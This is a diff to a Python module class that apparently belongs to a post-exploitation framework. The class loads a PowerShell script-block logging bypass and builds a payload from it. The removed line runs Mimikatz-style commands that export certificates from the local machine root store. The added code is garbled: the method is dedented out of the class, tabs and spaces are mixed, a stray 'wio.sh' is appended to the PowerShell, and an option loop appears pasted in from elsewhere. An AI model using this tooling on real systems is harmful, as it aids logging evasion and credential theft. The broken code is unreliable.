@@ -48,10 +48,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
-        
+def generate(self):
+
+        moduleName = self.info["Name"]
+
+         
         moduleSource = self.mainMenu.installPath + "/data/module_source/management/Bypass-ScriptBlock.ps1"
+
         try:
             f = open(moduleSource, 'r')
         except:
@@ -62,8 +65,17 @@ class Module:
         f.close()
 
         script = moduleCode
-        
-         
-        script += """Invoke-Bypass -Command 'crypto::capi privilege::debug crypto::cng "crypto::certificates /systemstore:local_machine /store:root /export"' """
-        
+
+        script += "\nwio.sh"
+
+        for option,values in self.options.iteritems():
+            if option.lower() != "agent":
+                if values['Value'] and values['Value'] != '':
+                    if values['Value'].lower() == "true":
+                        
+                        script += " -" + str(option)
+                    else:
+                        script += " -" + str(option) + " " + str(values['Value'])
+	script += ' | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
+   		    
         return script
